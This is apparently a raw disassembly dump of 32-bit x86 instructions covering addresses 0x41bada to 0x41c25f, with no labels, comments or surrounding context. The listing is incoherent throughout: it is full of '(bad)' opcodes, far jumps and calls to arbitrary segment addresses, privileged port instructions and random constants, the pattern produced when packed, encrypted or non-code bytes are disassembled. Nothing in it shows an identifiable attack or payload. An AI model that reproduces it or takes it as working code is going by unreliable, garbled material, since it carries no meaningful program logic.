  41bada:	or     BYTE PTR [edi],bl
  41badc:	jmp    0xe9dc:0xa0caffed
  41bae3:	mov    ds:0x88830abd,al
  41bae8:	in     al,dx
  41bae9:	imul   ecx,DWORD PTR [edx+eax*1+0xc5c6b8c],0x19
  41baf1:	and    eax,0x1faaf843
  41baf6:	(bad)  
  41baf7:	pop    edi
  41baf8:	sub    eax,0xcb69c114
  41bafd:	inc    esi
  41bafe:	push   ebx
  41baff:	sbb    al,0x33
  41bb01:	xchg   ecx,eax
  41bb02:	sbb    edx,DWORD PTR [eax-0x80]
  41bb05:	or     BYTE PTR [edx-0x35],ah
  41bb08:	adc    al,0xa6
  41bb0a:	jp     0x41bb7d
  41bb0c:	and    al,0xd7
  41bb0e:	mov    ah,0x67
  41bb10:	jge    0x41bb21
  41bb12:	sub    eax,0xda6f809c
  41bb17:	jns    0x41bac6
  41bb19:	mov    eax,ds:0xc468ed1d
  41bb1e:	pop    edi
  41bb1f:	mov    al,0x9c
  41bb21:	and    al,0x37
  41bb23:	mov    eax,ebp
  41bb25:	ror    DWORD PTR [eax+0x3be24bf5],0xd1
  41bb2c:	mov    eax,0x365b70af
  41bb31:	xchg   DWORD PTR [esi+0xe768a0a],esp
  41bb37:	test   ebp,ecx
  41bb39:	jl     0x41bba1
  41bb3b:	sar    DWORD PTR [ebp+0x74],1
  41bb3e:	out    0x43,eax
  41bb40:	lods   al,BYTE PTR ds:[esi]
  41bb41:	add    BYTE PTR [ebx],bl
  41bb43:	clc    
  41bb44:	pop    eax
  41bb45:	jb     0x41bb11
  41bb47:	call   0xff43:0xf335a426
  41bb4e:	les    edi,FWORD PTR [edi]
  41bb50:	mov    bl,0x50
  41bb52:	sub    al,0x71
  41bb54:	fidiv  DWORD PTR [edi-0x68]
  41bb57:	xchg   ecx,eax
  41bb58:	mov    al,0x22
  41bb5a:	xor    eax,ecx
  41bb5c:	push   es
  41bb5d:	(bad)  
  41bb5f:	sbb    esp,ecx
  41bb61:	fdiv   DWORD PTR [ebx]
  41bb63:	mov    ebp,0x993a7497
  41bb68:	(bad)  
  41bb69:	pop    ecx
  41bb6a:	ror    DWORD PTR [eax-0x50],1
  41bb6d:	imul   esp
  41bb6f:	jb     0x41bb52
  41bb71:	inc    esi
  41bb72:	mov    ch,0xb2
  41bb74:	pop    ebp
  41bb75:	cmp    DWORD PTR [edx],ebx
  41bb77:	pop    edi
  41bb78:	adc    cl,dh
  41bb7a:	bound  esi,QWORD PTR [edx-0x170933]
  41bb80:	sub    al,dl
  41bb82:	xor    esi,DWORD PTR [edi+0x4971c4e5]
  41bb88:	and    DWORD PTR [esi+0x24],edi
  41bb8b:	loope  0x41bbe9
  41bb8d:	inc    BYTE PTR [ecx-0x50db937e]
  41bb93:	ds push cs
  41bb95:	call   0x883f:0x16aa1174
  41bb9c:	les    esi,FWORD PTR [ebp+0x2e]
  41bb9f:	mov    ebp,0x69bdb797
  41bba4:	xor    ch,BYTE PTR [ecx]
  41bba6:	push   cs
  41bba7:	leave  
  41bba8:	cli    
  41bba9:	aaa    
  41bbaa:	jp     0x41bb49
  41bbac:	and    esi,DWORD PTR [edx]
  41bbae:	out    dx,eax
  41bbaf:	(bad)  
  41bbb0:	in     al,0x41
  41bbb2:	ret    0x9bcd
  41bbb5:	call   0x4eb7:0x7b0da064
  41bbbc:	fwait
  41bbbd:	mov    ah,0x85
  41bbbf:	stos   BYTE PTR es:[edi],al
  41bbc0:	add    al,0x96
  41bbc2:	mov    ch,0xb6
  41bbc4:	pusha  
  41bbc5:	jmp    0x463b770
  41bbca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbcb:	icebp  
  41bbcc:	or     eax,0xeffa55e6
  41bbd1:	pop    esp
  41bbd2:	pop    esp
  41bbd3:	bnd ret 0xfc23
  41bbd7:	dec    esi
  41bbd8:	leave  
  41bbd9:	lock pop ss
  41bbdb:	sbb    DWORD PTR ds:0x3812874b,0xe6efc051
  41bbe5:	jae    0x41bc08
  41bbe7:	adc    al,BYTE PTR [ebp-0x685b92]
  41bbed:	sbb    esp,DWORD PTR [ebp-0x4a]
  41bbf0:	not    DWORD PTR [ecx+0x47]
  41bbf3:	inc    edi
  41bbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf5:	push   esp
  41bbf6:	aas    
  41bbf7:	into   
  41bbf8:	popa   
  41bbf9:	cmp    al,0x6f
  41bbfb:	sti    
  41bbfc:	mov    ah,0x81
  41bbfe:	adc    BYTE PTR [esi+0x1c],0x9e
  41bc02:	retf   0x22a2
  41bc05:	mov    al,0x6a
  41bc07:	imul   esi,DWORD PTR [ebx+0x6f],0x77937834
  41bc0e:	das    
  41bc0f:	mov    edx,0x6dc3752d
  41bc14:	nop
  41bc15:	sub    BYTE PTR [eax+0x1],0xee
  41bc19:	(bad)  
  41bc1a:	sbb    edx,DWORD PTR [ecx+0x790423f9]
  41bc20:	sbb    DWORD PTR [ebx],0xfe1720c7
  41bc26:	pop    ebx
  41bc27:	adc    cl,bh
  41bc29:	lds    esp,FWORD PTR [esi-0x6c]
  41bc2c:	and    al,0x3d
  41bc2e:	dec    edx
  41bc2f:	fwait
  41bc30:	retf   0x877e
  41bc33:	fs mov bl,0x6f
  41bc36:	push   edx
  41bc37:	rcr    BYTE PTR [eax],0x5e
  41bc3a:	mov    ds:0x2c650cbc,eax
  41bc40:	loope  0x41bbd9
  41bc42:	mov    cl,0x70
  41bc44:	out    0xf1,al
  41bc46:	shl    BYTE PTR [ebx+0x417263a5],1
  41bc4c:	adc    eax,0x916a617
  41bc51:	or     bl,cl
  41bc53:	mov    edx,0xeea41832
  41bc58:	retf   0xbd6a
  41bc5b:	inc    esi
  41bc5c:	xor    dl,BYTE PTR [ecx+0x39]
  41bc5f:	inc    esp
  41bc60:	stos   BYTE PTR es:[edi],al
  41bc61:	test   DWORD PTR [eax+0x50],edi
  41bc64:	push   esp
  41bc65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc66:	jge    0x41bc50
  41bc68:	xor    al,0x99
  41bc6a:	adc    eax,0x3e657cdd
  41bc6f:	xchg   esi,eax
  41bc70:	push   edi
  41bc71:	push   esp
  41bc72:	call   0xec1478c2
  41bc77:	in     eax,dx
  41bc78:	hlt    
  41bc79:	outs   dx,DWORD PTR ds:[esi]
  41bc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc7b:	in     al,0x8e
  41bc7d:	dec    eax
  41bc7e:	pop    edi
  41bc7f:	inc    edx
  41bc80:	ins    BYTE PTR es:[edi],dx
  41bc81:	cmp    DWORD PTR [ebp+0x52],0xffffffd3
  41bc85:	mov    bl,0x1
  41bc87:	and    al,0x75
  41bc89:	out    0xd0,eax
  41bc8b:	shl    DWORD PTR [ebx],cl
  41bc8d:	shr    BYTE PTR [eax],0x75
  41bc90:	push   edx
  41bc91:	cmp    eax,0xa1a10f40
  41bc96:	jle    0x41bc6b
  41bc98:	cli    
  41bc99:	lea    ecx,fs:[edx+0x37]
  41bc9d:	popf   
  41bc9e:	nop
  41bc9f:	rol    DWORD PTR [ebx+0x38],1
  41bca2:	sbb    eax,DWORD PTR [esp+ebp*1]
  41bca5:	sahf   
  41bca6:	call   0x1ad5b004
  41bcab:	fscale 
  41bcad:	xor    BYTE PTR ds:0xff31ea7e,al
  41bcb3:	test   eax,0x8dd70880
  41bcb8:	call   0x9a2c07de
  41bcbd:	jb     0x41bc98
  41bcbf:	call   ebx
  41bcc1:	push   esi
  41bcc2:	sub    edx,DWORD PTR [ebp-0x3b]
  41bcc5:	dec    ecx
  41bcc6:	mov    esi,DWORD PTR [ebp+0x3dde7735]
  41bccc:	add    eax,0x70c63aa6
  41bcd1:	aas    
  41bcd2:	out    dx,al
  41bcd3:	pusha  
  41bcd4:	xchg   edx,eax
  41bcd5:	sub    dh,ah
  41bcd7:	xor    eax,eax
  41bcd9:	and    DWORD PTR [esi+0x20],0x78
  41bcdd:	sub    esi,0xb79a49c7
  41bce3:	xchg   edx,eax
  41bce4:	mov    ah,0xa3
  41bce6:	mov    ebx,0x946d9553
  41bceb:	std    
  41bcec:	stos   BYTE PTR es:[edi],al
  41bced:	cs (bad) 
  41bcef:	shr    BYTE PTR [edi],0xf3
  41bcf2:	std    
  41bcf3:	pushf  
  41bcf4:	lods   al,BYTE PTR ds:[esi]
  41bcf5:	mov    ebp,0x8a3af3b5
  41bcfa:	dec    ebp
  41bcfb:	dec    esi
  41bcfc:	imul   ebp,DWORD PTR [eax+0x73e214e6],0xafaae867
  41bd06:	hlt    
  41bd07:	aad    0xcf
  41bd09:	mov    bh,0xee
  41bd0b:	test   al,0x4d
  41bd0d:	adc    al,dl
  41bd0f:	ss push edi
  41bd11:	mov    al,ds:0xdf6f9814
  41bd16:	loope  0x41bd5e
  41bd18:	adc    al,0xd5
  41bd1a:	pop    ss
  41bd1b:	and    eax,ebx
  41bd1d:	push   edx
  41bd1e:	push   esi
  41bd1f:	xchg   esp,eax
  41bd20:	test   al,0xc4
  41bd22:	lea    edx,fs:[ebx+0x5df22ee9]
  41bd29:	ins    BYTE PTR es:[edi],dx
  41bd2a:	add    bh,bl
  41bd2c:	inc    ecx
  41bd2d:	push   esp
  41bd2e:	cmp    eax,0xd4ed12bf
  41bd33:	mov    edx,esi
  41bd35:	xor    ecx,DWORD PTR [eax]
  41bd37:	adc    edx,esi
  41bd39:	ja     0x41bd59
  41bd3b:	lds    edi,FWORD PTR [ebx]
  41bd3d:	mov    eax,0x7defa4f5
  41bd42:	or     esp,DWORD PTR [ebx-0x45]
  41bd45:	das    
  41bd46:	jecxz  0x41bd9d
  41bd48:	sub    eax,0x564a2d52
  41bd4d:	ja     0x41bdb9
  41bd4f:	retf   
  41bd50:	sti    
  41bd51:	inc    ecx
  41bd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd53:	and    dx,WORD PTR [ebx+0x45]
  41bd57:	jmp    0xdc61:0x548c9c1
  41bd5e:	enter  0xde60,0xb0
  41bd62:	and    eax,0xb4d5359f
  41bd67:	pusha  
  41bd68:	imul   ecx,ecx,0x8
  41bd6b:	gs inc edx
  41bd6d:	sbb    al,0xa8
  41bd6f:	jl     0x41bda7
  41bd71:	xchg   edi,eax
  41bd72:	inc    ecx
  41bd73:	sub    dh,BYTE PTR [ebx]
  41bd75:	xchg   edi,eax
  41bd76:	add    al,0xf3
  41bd78:	mov    eax,ds:0xb971ecb0
  41bd7d:	stos   BYTE PTR es:[edi],al
  41bd7e:	sbb    eax,0xa6610c4b
  41bd83:	mov    dl,0x72
  41bd85:	jnp    0x41bd9a
  41bd87:	xchg   ebx,eax
  41bd88:	call   0x867487cf
  41bd8d:	std    
  41bd8e:	int    0xa
  41bd90:	retf   0x8c30
  41bd93:	jp     0x41bde8
  41bd95:	sub    esi,DWORD PTR [edi]
  41bd97:	cmp    eax,0xf58be07c
  41bd9c:	mov    BYTE PTR [ebp-0x7d0dab28],dh
  41bda2:	mov    dh,0x38
  41bda4:	adc    al,0x4f
  41bda6:	xchg   edx,eax
  41bda7:	mov    ch,0x72
  41bda9:	adc    bh,dl
  41bdab:	add    al,0xd1
  41bdad:	loope  0x41bdbc
  41bdaf:	jbe    0x41bdee
  41bdb1:	mov    esi,ecx
  41bdb3:	jo     0x41bd6c
  41bdb5:	mov    al,BYTE PTR [eax+0x41]
  41bdb8:	ret    0xc472
  41bdbb:	loopne 0x41bd3f
  41bdbd:	js     0x41bd5b
  41bdbf:	push   0x10
  41bdc1:	add    al,0x12
  41bdc3:	shl    BYTE PTR [ebx],1
  41bdc5:	and    ebp,ebp
  41bdc7:	mov    ds:0xd9124034,al
  41bdcc:	inc    ecx
  41bdcd:	adc    al,0x60
  41bdcf:	sbb    BYTE PTR [esi+0x4d],dl
  41bdd2:	mov    bl,0x32
  41bdd4:	dec    edi
  41bdd5:	pop    ss
  41bdd6:	mov    dl,0xc5
  41bdd8:	(bad)  
  41bdd9:	mov    ebx,0xb5cd861
  41bdde:	sbb    ah,al
  41bde0:	loopne 0x41be36
  41bde2:	js     0x41bdf8
  41bde4:	jno    0x41be55
  41bde6:	xchg   esp,ebp
  41bde8:	ins    BYTE PTR es:[edi],dx
  41bde9:	adc    DWORD PTR [eax-0x13],0xa6163c22
  41bdf0:	fs inc ebx
  41bdf2:	push   es
  41bdf3:	int3   
  41bdf4:	daa    
  41bdf5:	je     0x41bd96
  41bdf7:	xor    al,0xf2
  41bdf9:	push   ss
  41bdfa:	push   esp
  41bdfb:	jp     0x41be77
  41bdfd:	pop    es
  41bdfe:	jmp    0xc151:0xc402aa18
  41be05:	cwde   
  41be06:	pop    edi
  41be07:	jmp    0x5e586da4
  41be0c:	pop    ss
  41be0d:	dec    DWORD PTR [esi-0xe]
  41be10:	popf   
  41be11:	test   eax,0x1184c862
  41be16:	sti    
  41be17:	int    0xab
  41be19:	(bad)  
  41be1b:	push   edx
  41be1c:	dec    esi
  41be1d:	mov    ebx,0x43a91be0
  41be22:	leave  
  41be23:	jno    0x41be1e
  41be25:	mov    eax,0x4d181123
  41be2a:	add    BYTE PTR [edx-0x662a2a47],ah
  41be30:	stos   BYTE PTR es:[edi],al
  41be31:	pop    ebx
  41be32:	leave  
  41be33:	push   cs
  41be34:	jge    0x41be9f
  41be36:	and    DWORD PTR [edi-0x6c],0x828143e3
  41be3d:	pop    edx
  41be3f:	xchg   esp,eax
  41be40:	push   0x31e92969
  41be45:	mov    ?,WORD PTR [eax+0xbf37fea]
  41be4b:	and    al,BYTE PTR [eax]
  41be4d:	adc    al,0xdf
  41be4f:	leave  
  41be50:	test   al,0xec
  41be52:	test   esp,ebp
  41be54:	ins    DWORD PTR es:[edi],dx
  41be55:	and    DWORD PTR [ebx],edi
  41be57:	rcl    DWORD PTR [esi+ecx*4-0x3e04e01f],1
  41be5e:	retf   0xf95d
  41be61:	out    dx,eax
  41be62:	dec    DWORD PTR [ecx]
  41be64:	test   al,0xc9
  41be66:	or     bh,ah
  41be68:	push   cs
  41be69:	jb     0x41bedd
  41be6b:	adc    DWORD PTR [edx],esp
  41be6d:	push   0xa56b55c7
  41be72:	xlat   BYTE PTR ds:[ebx]
  41be73:	in     eax,dx
  41be74:	pop    es
  41be75:	push   eax
  41be76:	sbb    ebx,DWORD PTR [ebx+0x213ad8bb]
  41be7c:	mov    al,ds:0x6c07349
  41be81:	push   esi
  41be82:	test   al,0x92
  41be84:	xor    dh,dl
  41be86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be87:	inc    edx
  41be88:	arpl   WORD PTR [ebp+0x34],di
  41be8b:	jno    0x41be9d
  41be8d:	(bad)
  41be90:	pop    ds
  41be91:	sub    bh,BYTE PTR [edi+0x3be68e2a]
  41be97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be98:	and    BYTE PTR [ebx],bh
  41be9a:	fcomip st,st(2)
  41be9c:	inc    eax
  41be9d:	sub    BYTE PTR [ecx+0x26],ch
  41bea0:	sub    DWORD PTR [ebx+edi*2],0xe6d4e36c
  41bea7:	scas   al,BYTE PTR es:[edi]
  41bea8:	add    eax,0x2f597bf3
  41bead:	in     eax,dx
  41beae:	sub    BYTE PTR [edi],bl
  41beb0:	seto   BYTE PTR [eax+0x31ef4d2a]
  41beb7:	addr16 out 0x6c,al
  41beba:	xchg   BYTE PTR [esi],ch
  41bebc:	stos   DWORD PTR es:[edi],eax
  41bebd:	leave  
  41bebe:	lods   eax,DWORD PTR ds:[esi]
  41bebf:	rol    BYTE PTR [eax+0x6c],1
  41bec2:	nop
  41bec3:	ja     0x41bf41
  41bec5:	addr16 aas 
  41bec7:	dec    eax
  41bec8:	pop    es
  41bec9:	in     al,0x30
  41becb:	jle    0x41be7a
  41becd:	out    dx,eax
  41bece:	push   ebx
  41becf:	into   
  41bed0:	sti    
  41bed1:	jnp    0x41bf27
  41bed3:	shl    BYTE PTR [ebx+0x22cccd7a],1
  41bed9:	cmp    dh,cl
  41bedb:	js     0x41bece
  41bedd:	cmp    eax,0xbe5174c2
  41bee2:	inc    ecx
  41bee3:	mov    dh,0x92
  41bee5:	xchg   esp,eax
  41bee6:	sub    esp,0x62
  41bee9:	rol    edi,1
  41beeb:	inc    ebx
  41beec:	mov    ss,WORD PTR [edi]
  41beee:	pusha  
  41beef:	out    dx,al
  41bef0:	fmulp  st(4),st
  41bef2:	retf   
  41bef3:	xor    al,0xf8
  41bef5:	adc    ch,al
  41bef7:	mov    ebp,0xde59d67b
  41befc:	xchg   esi,eax
  41befd:	pop    ss
  41befe:	les    edi,FWORD PTR [edi-0x54]
  41bf01:	loopne 0x41beb1
  41bf03:	mov    ecx,0x9870afb
  41bf08:	inc    ebp
  41bf09:	mov    cl,0x4e
  41bf0b:	test   eax,0x163728b7
  41bf10:	pop    ds
  41bf11:	mov    ebp,0x2bd298ff
  41bf17:	loope  0x41bf38
  41bf19:	xor    al,BYTE PTR [esi+0x2b557eef]
  41bf1f:	jno    0x41beeb
  41bf21:	dec    edx
  41bf22:	test   BYTE PTR [ebx+0x7e],ah
  41bf25:	sti    
  41bf26:	add    BYTE PTR [edx+0x72],ch
  41bf29:	icebp  
  41bf2a:	add    eax,0x9bb52765
  41bf2f:	push   0x6a9e590d
  41bf34:	retf   
  41bf35:	cs loopne 0x41bee6
  41bf38:	in     eax,dx
  41bf39:	mov    esi,0x9c772840
  41bf3e:	daa    
  41bf3f:	je     0x41bf6b
  41bf41:	inc    ecx
  41bf42:	outs   dx,DWORD PTR ds:[esi]
  41bf43:	jne    0x41bf58
  41bf45:	jnp    0x41bf11
  41bf47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf48:	add    edi,DWORD PTR [esi+eiz*8-0x5e8c25db]
  41bf4f:	dec    edi
  41bf50:	js     0x41bf83
  41bf52:	mov    al,ah
  41bf54:	sbb    BYTE PTR [ebx+0x4aa9dc65],bl
  41bf5a:	mov    dh,BYTE PTR [esi]
  41bf5c:	pop    eax
  41bf5d:	into   
  41bf5e:	adc    DWORD PTR [edi-0x6adf5ec0],0x2f
  41bf65:	sahf   
  41bf66:	rcr    DWORD PTR [ebx],0x67
  41bf69:	sbb    al,0x61
  41bf6b:	or     bl,BYTE PTR [esi-0x1d2d8339]
  41bf71:	inc    edi
  41bf72:	sbb    DWORD PTR [ecx],0xc37ec152
  41bf78:	push   eax
  41bf79:	cwde   
  41bf7a:	push   ecx
  41bf7b:	sbb    eax,0x259cc317
  41bf80:	sbb    DWORD PTR [ebp+0x26],edx
  41bf83:	mov    ebp,0x60db9966
  41bf88:	inc    ebp
  41bf89:	mov    dl,cl
  41bf8b:	adc    BYTE PTR [ecx],ah
  41bf8d:	test   eax,0x2869d50
  41bf92:	mov    eax,0xd0848c2e
  41bf97:	test   bl,ch
  41bf99:	inc    esp
  41bf9a:	mov    al,0x32
  41bf9c:	leave  
  41bf9d:	push   ds
  41bf9e:	pop    ds
  41bf9f:	sub    eax,0x7a3a260
  41bfa4:	fwait
  41bfa5:	mov    eax,DWORD PTR ds:0xc809327e
  41bfab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfac:	fisttp DWORD PTR [bp+di-0x1f42]
  41bfb1:	cmp    eax,0xe88d6960
  41bfb6:	mov    ah,0xe4
  41bfb8:	lds    ebp,FWORD PTR [eax-0x3e]
  41bfbb:	loopne 0x41bf88
  41bfbd:	imul   esp,edi,0xd74ab0a5
  41bfc3:	push   es
  41bfc4:	jae    0x41bf9d
  41bfc6:	stos   BYTE PTR es:[edi],al
  41bfc7:	adc    al,0x1c
  41bfc9:	(bad)
  41bfcd:	loop   0x41c027
  41bfcf:	mov    ch,BYTE PTR [edx+0x15]
  41bfd2:	test   DWORD PTR [edx-0x3f],esi
  41bfd5:	pop    DWORD PTR ds:0xdb29527d
  41bfdb:	pop    ds
  41bfdc:	and    DWORD PTR [ebx+ebp*2-0x23],ebp
  41bfe0:	mov    al,ds:0x6bde42a8
  41bfe5:	inc    eax
  41bfe6:	pop    esi
  41bfe8:	inc    esp
  41bfe9:	adc    eax,0xf3eddf56
  41bfee:	lahf   
  41bfef:	les    esp,FWORD PTR [ebp+0x53]
  41bff2:	mov    bh,0x27
  41bff4:	adc    ecx,DWORD PTR [eax]
  41bff6:	adc    BYTE PTR [edi],bl
  41bff8:	cmp    BYTE PTR ds:0x569dc053,ch
  41bffe:	in     al,dx
  41bfff:	add    DWORD PTR [ebx],0xdbeed6e9
  41c005:	mov    bh,al
  41c007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c008:	cmp    DWORD PTR [edi-0x761c097d],esp
  41c00e:	icebp  
  41c00f:	or     eax,0x34dfc077
  41c014:	adc    al,0x1e
  41c016:	add    BYTE PTR [ebp+0x50763544],dl
  41c01c:	popf   
  41c01d:	xlat   BYTE PTR ds:[ebx]
  41c01e:	fisttp WORD PTR [edx-0x553af8c5]
  41c024:	sti    
  41c025:	mov    cl,0x78
  41c027:	cmp    eax,DWORD PTR [ebp-0x80]
  41c02a:	cdq    
  41c02b:	f2xm1  
  41c02d:	jg     0x41c09b
  41c02f:	stos   DWORD PTR es:[edi],eax
  41c030:	dec    esp
  41c031:	jbe    0x41c09b
  41c033:	push   0x256cc96c
  41c038:	mov    ebp,0x80ef3ae2
  41c03d:	xchg   DWORD PTR [ebx-0x7f],esp
  41c040:	and    ah,ah
  41c042:	jno    0x41c08c
  41c044:	xchg   ecx,eax
  41c045:	xchg   edi,eax
  41c046:	ret    0xdae
  41c049:	sbb    bh,BYTE PTR [edx]
  41c04b:	arpl   WORD PTR [ebx+0x65250c8],ax
  41c051:	add    BYTE PTR [ecx],ch
  41c053:	sar    DWORD PTR [esp+edi*8],cl
  41c056:	xchg   ebx,eax
  41c057:	shl    ch,1
  41c059:	sti    
  41c05a:	jecxz  0x41c055
  41c05c:	ror    WORD PTR [ecx+0x2ab53917],0xf0
  41c064:	bnd jmp 0x41c0bc
  41c067:	push   ds
  41c068:	push   ss
  41c069:	fisttp QWORD PTR [esi]
  41c06b:	add    DWORD PTR [eax+0x52555687],ebx
  41c071:	add    DWORD PTR [edx+0x7bc4f034],esi
  41c077:	jp     0x41c025
  41c079:	dec    ecx
  41c07a:	je     0x41c0b0
  41c07c:	add    eax,0x2248d904
  41c081:	pop    es
  41c082:	je     0x41c074
  41c084:	es mov ch,0x9e
  41c087:	fdivr  QWORD PTR [ecx]
  41c089:	(bad)  
  41c08a:	cs xchg ebx,eax
  41c08c:	ror    DWORD PTR [esi-0x629eaaa7],cl
  41c092:	xor    DWORD PTR [ecx+esi*8],0x9d859b48
  41c099:	pop    ss
  41c09a:	jmp    0x41c096
  41c09c:	push   es
  41c09d:	mov    esp,0xa6efed20
  41c0a2:	aas    
  41c0a3:	loopne 0x41c0f4
  41c0a5:	adc    ch,BYTE PTR [edx-0x3c]
  41c0a8:	bound  eax,QWORD PTR ss:[edx+esi*1-0x3d]
  41c0ad:	data16 jae 0x41c0ba
  41c0b0:	dec    ebx
  41c0b1:	jb     0x41c127
  41c0b3:	sbb    edi,DWORD PTR [ebp+edx*2-0x5c]
  41c0b7:	ret    
  41c0b8:	mov    ss,WORD PTR [ecx+esi*8]
  41c0bb:	std    
  41c0bc:	ret    
  41c0bd:	adc    edi,esp
  41c0bf:	cmp    DWORD PTR [eax+esi*2+0x2b],edx
  41c0c3:	mov    ch,0x78
  41c0c5:	cdq    
  41c0c6:	add    DWORD PTR [eax+0x61],ecx
  41c0c9:	mov    BYTE PTR [ecx-0x21],bh
  41c0cc:	out    0x6b,al
  41c0ce:	jnp    0x41c0c7
  41c0d0:	ss xor al,0x4a
  41c0d3:	jb     0x41c0ff
  41c0d5:	dec    esi
  41c0d6:	adc    ebp,0x25a75830
  41c0dc:	jnp    0x41c11c
  41c0de:	sub    al,0x43
  41c0e0:	push   ecx
  41c0e1:	aad    0x63
  41c0e3:	loop   0x41c0f4
  41c0e5:	bound  ebp,QWORD PTR [esi+0xd]
  41c0e8:	jmp    0xca2a:0x971c9d2a
  41c0ef:	jns    0x41c0d5
  41c0f1:	test   bl,0xef
  41c0f4:	mov    edi,0x2a1e47df
  41c0f9:	mov    edi,0x427b2c39
  41c0fe:	fmulp  st(2),st
  41c100:	push   ebp
  41c101:	mov    al,0x76
  41c103:	adc    al,0xc8
  41c105:	int    0xf8
  41c107:	fisttp WORD PTR [edx-0x7a9b0406]
  41c10d:	test   DWORD PTR [ebp-0xa51382],edi
  41c113:	xchg   DWORD PTR [ebx],ecx
  41c115:	neg    BYTE PTR [ecx-0x39]
  41c118:	push   0xffffffd6
  41c11a:	call   0x3800:0x3cc0f097
  41c121:	call   0xd258:0xace905de
  41c128:	adc    bl,dh
  41c12a:	hlt    
  41c12b:	int    0x86
  41c12d:	rol    DWORD PTR [esi],cl
  41c12f:	jbe    0x41c110
  41c131:	and    DWORD PTR [eax+ebp*1],ecx
  41c134:	mov    dl,0x94
  41c136:	sub    ebp,DWORD PTR [esi+0x4c]
  41c139:	mov    al,ds:0xff03b759
  41c13e:	lahf   
  41c13f:	xchg   edi,eax
  41c140:	arpl   WORD PTR [ebp+0x31],di
  41c143:	adc    BYTE PTR [ebp+0x18],dl
  41c146:	pushf  
  41c147:	add    eax,DWORD PTR [edx+0x0]
  41c14a:	aaa    
  41c14b:	mov    ds:0x792ab91a,al
  41c150:	jns    0x41c1ca
  41c152:	inc    edi
  41c153:	cli    
  41c154:	adc    DWORD PTR [eax-0x21],esi
  41c157:	les    edx,FWORD PTR [ebp-0x54293c73]
  41c15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c15e:	fild   WORD PTR [eax]
  41c160:	aad    0x41
  41c162:	stc    
  41c163:	into   
  41c164:	sahf   
  41c165:	xchg   ebp,eax
  41c166:	sub    al,0xaa
  41c168:	pop    es
  41c169:	fs xchg edi,eax
  41c16b:	fnsave [edi-0x49cd7e38]
  41c171:	aaa    
  41c172:	outs   dx,BYTE PTR ds:[esi]
  41c173:	inc    esp
  41c174:	ret    0x71b1
  41c177:	jbe    0x41c125
  41c179:	xor    BYTE PTR [ecx+0x57],ah
  41c17c:	sbb    eax,0xcf42a989
  41c181:	sub    al,0x8f
  41c183:	cmp    edi,esp
  41c185:	xchg   ebx,eax
  41c186:	jns    0x41c123
  41c188:	out    0x33,eax
  41c18a:	sbb    eax,0x6eb44c73
  41c18f:	int3   
  41c190:	int3   
  41c191:	retf   0xa293
  41c194:	icebp  
  41c195:	dec    ebx
  41c196:	add    DWORD PTR [eax],edx
  41c198:	adc    edx,DWORD PTR [esi]
  41c19a:	hlt    
  41c19b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c19c:	xor    bl,BYTE PTR [edx-0x446e603e]
  41c1a2:	mov    al,0x4d
  41c1a4:	inc    ecx
  41c1a5:	lahf   
  41c1a6:	out    0x62,eax
  41c1a8:	jmp    0x41c17d
  41c1aa:	test   DWORD PTR [edi-0x71],0xc2aabeca
  41c1b1:	mov    eax,0x955c1720
  41c1b6:	inc    ebx
  41c1b7:	into   
  41c1b8:	push   edi
  41c1b9:	cmp    eax,0x1f454253
  41c1be:	div    al
  41c1c0:	mov    esp,0x6b54f474
  41c1c5:	dec    edi
  41c1c6:	adc    dh,BYTE PTR [esi-0x6d]
  41c1c9:	aas    
  41c1ca:	push   0x158c8c49
  41c1cf:	daa    
  41c1d0:	imul   ebx,ecx,0x2c
  41c1d3:	out    dx,eax
  41c1d4:	mov    ebx,0x337a84e2
  41c1d9:	xor    DWORD PTR [ecx-0x41],eax
  41c1dc:	adc    cl,BYTE PTR [esi]
  41c1de:	mov    ds:0x9060fc7e,al
  41c1e3:	or     esp,DWORD PTR [ebx]
  41c1e5:	add    al,0x10
  41c1e7:	aam    0xb1
  41c1e9:	fnstcw WORD PTR [ebx+0x14]
  41c1ec:	cmp    edi,ecx
  41c1ee:	adc    eax,0xce841011
  41c1f3:	out    0x2b,eax
  41c1f5:	arpl   sp,di
  41c1f7:	outs   dx,BYTE PTR ds:[esi]
  41c1f8:	sbb    cl,BYTE PTR [esp+esi*1+0x10c8e639]
  41c1ff:	jno    0x41c230
  41c201:	mov    ch,dl
  41c203:	mov    cl,0x96
  41c205:	cwde   
  41c206:	mov    edi,0xc35a557
  41c20b:	dec    esp
  41c20c:	stc    
  41c20d:	scas   al,BYTE PTR es:[edi]
  41c20e:	xchg   edi,eax
  41c20f:	scas   al,BYTE PTR es:[edi]
  41c210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c211:	adc    al,0x3
  41c213:	dec    esp
  41c214:	sub    ch,0xbb
  41c217:	lods   eax,DWORD PTR ds:[esi]
  41c218:	icebp  
  41c219:	sub    ebp,edx
  41c21b:	in     al,0xab
  41c21d:	mov    dl,0x94
  41c21f:	lock jmp 0x6640:0xbb7c2244
  41c227:	int3   
  41c228:	mov    edx,DWORD PTR [eax]
  41c22a:	call   0x629914b9
  41c22f:	xchg   ecx,eax
  41c230:	jl     0x41c1e7
  41c232:	push   ds
  41c233:	cdq    
  41c234:	adc    eax,0xf4ba869f
  41c239:	in     eax,dx
  41c23a:	jbe    0x41c205
  41c23c:	xchg   DWORD PTR [edi],edi
  41c23e:	out    dx,eax
  41c23f:	bound  ebx,QWORD PTR [edx]
  41c241:	fs out 0x3f,al
  41c244:	ds pop ss
  41c246:	mov    ebp,0xbee58b78
  41c24b:	inc    ebp
  41c24c:	mov    bl,0x28
  41c24e:	shl    ch,1
  41c250:	cmp    ebp,DWORD PTR [edi-0x3d9218e9]
  41c256:	mov    edx,esi
  41c258:	stos   DWORD PTR es:[edi],eax
  41c259:	mov    ebx,0x8d24f173
  41c25e:	in     al,dx
  41c25f:	mov    al,cl
